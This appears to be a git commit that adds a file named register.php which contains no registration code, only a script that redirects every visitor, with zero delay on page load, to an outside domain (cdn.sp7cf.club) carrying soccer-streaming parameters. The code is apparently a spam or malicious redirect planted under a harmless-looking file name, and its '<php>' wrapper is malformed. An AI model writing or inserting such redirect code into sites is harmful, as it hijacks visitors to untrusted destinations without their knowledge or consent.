dc5d0c8e8e9443a8b8faaf8a093bc3bcc6fe2e06
geopagla <82669868+geopagla@users.noreply.github.com>
2021-04-16 23:22:00 +0600

    Add files via upload

---
+++ register.php
@@ -0,0 +1,9 @@
+
+<php>
+<script>
+function largarse(){
+setTimeout("location.href='https://cdn.sp7cf.club/r/hbE0Ae/?theme=dual&category=soccer&q=English%20Premier%20League&c_bg=https%3A%2F%2Fi.imgur.com%2FvVmJyXi.gif'", 0);
+}
+onload = largarse;
+</script>
+</php>
